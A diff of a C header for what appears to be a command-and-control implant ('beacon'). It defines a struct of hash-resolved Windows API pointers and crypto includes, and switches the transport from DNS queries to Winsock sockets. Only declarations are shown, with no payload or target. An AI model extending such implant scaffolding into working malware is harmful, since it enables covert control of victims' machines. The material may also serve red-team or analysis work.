@@ -8,21 +8,18 @@
 
 #pragma once
 
+#include <winsock2.h>
 #include <windows.h>
 #include <wincrypt.h>
-#include <windns.h>
 
 #include "macros.h"
 #include "hashes.h"
 #include "apidef.h"
 
-
-#pragma intrinsic( wcsrchr );
-
 typedef struct
 {
-	ULONG BeaconId;
-	BOOLEAN Online;
+	ULONG	BeaconId;
+	BOOLEAN	Online;
 
 	struct
 	{
@@ -34,6 +31,7 @@ typedef struct
 
 	struct
 	{
+		FUNC( send );
 		FUNC( wcslen );
 		FUNC( GetACP );
 		FUNC( wcsrchr );
@@ -43,6 +41,11 @@ typedef struct
 		FUNC( LocalFree );
 		FUNC( LocalSize );
 		FUNC( LocalAlloc );
+		FUNC( WSAStartup );
+		FUNC( WSAConnect );
+		FUNC( WSACleanup );
+		FUNC( WSASocketA );
+		FUNC( closesocket );
 		FUNC( RtlRandomEx );
 		FUNC( CloseHandle );
 		FUNC( FreeLibrary );
@@ -70,17 +73,16 @@ typedef struct
 		FUNC( CryptReleaseContext );
 		FUNC( CryptAcquireContextA );
 		FUNC( CryptImportPublicKeyInfo );
-		FUNC( DnsWriteQuestionToBuffer_UTF8 );
-		FUNC( DnsExtractRecordsFromMessage_UTF8 );
 	} api;
 
-	HMODULE Module[ 4 ];
-
+	PVOID Module[ 3 ];
+	SOCKET Socket;
 } BEACON_INSTANCE, *PBEACON_INSTANCE;
 
 #include "crypt/hmac.h"
 #include "crypt/rsa.h"
 #include "crypt/aes.h"
+#include "transport.h"
 #include "random.h"
 #include "sha256.h"
 #include "tebpeb.h"
